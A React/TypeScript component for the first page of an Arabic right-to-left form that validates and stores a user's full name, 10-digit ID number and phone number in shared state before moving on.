/* eslint-disable @typescript-eslint/ban-ts-comment */
import Input from "@/components/Input";
import Main from "@/components/Main";
import { Button } from "@/components/ui/button";
import { MAIN_BTN } from "@/constants/data";
import { useEffect, useState } from "react";
import { FieldValues, useForm } from "react-hook-form";
import PhoneInput from "react-phone-number-input";
import "react-phone-number-input/style.css";
import {
  currentPage,
  details,
  extraInfo,
  isAdminError,
  loading,
  message,
} from "../../context/signals";

function Page1() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ mode: "all" });

  function sendData(data: FieldValues) {
    isAdminError.value = false;

    message.value = "";

    extraInfo.value.fullName = data.fullName;
    extraInfo.value.email = data.email;
    extraInfo.value.number = data.number;
    extraInfo.value.phone = phone;

    details.value = {
      ...details.value,
      ...data,
      phone,
      time: new Date(),
    };

    loading.value = true;
  }

  const [phone, setValue] = useState("");
  useEffect(() => {
    currentPage.value = "page1";
  }, []);

  return (
    <Main>
      <form
        className="flex flex-col gap-8  w-full"
        onSubmit={handleSubmit(sendData)}
        dir="rtl"
      >
        <Input
          errors={errors}
          register={register}
          label="الاسم بالكامل"
          id="fullName"
          isAr
          options={{
            required: "هذا الحقل ضروري",
            validate: (val) => {
              const nameWithoutSpaces = val.replace(/\s/g, "");
              if (!/^[\u0600-\u06FF]+$/.test(nameWithoutSpaces))
                return "يجب كتابة الاسم بالعربي";
            },
          }}
        />
        <Input
          errors={errors}
          register={register}
          id="idNumber"
          type="number"
          label="رقم"
          isAr
          options={{
            required: "هذا الحقل ضروري",
            pattern: {
              value: /^[0-9]{10}$/,
              message: "يجب كتابة عشر أرقام",
            },
          }}
        />
        <div className="flex flex-col gap-2">
          <span className="text-xs font-medium">رقم الجوال الأساسي</span>
          <PhoneInput
            value={phone}
            // @ts-expect-error
            onChange={setValue}
            className={`px-2 bg-gray-100 w-full outline-none border rounded-lg relative transition-all  ${
              isAdminError.value ? "border-red-500" : "border-gray-300"
            }`}
          />
        </div>

        <Button disabled={!phone} className={MAIN_BTN + " w-[150px] mx-auto"}>
          التالي
        </Button>
      </form>
    </Main>
  );
}

export default Page1;
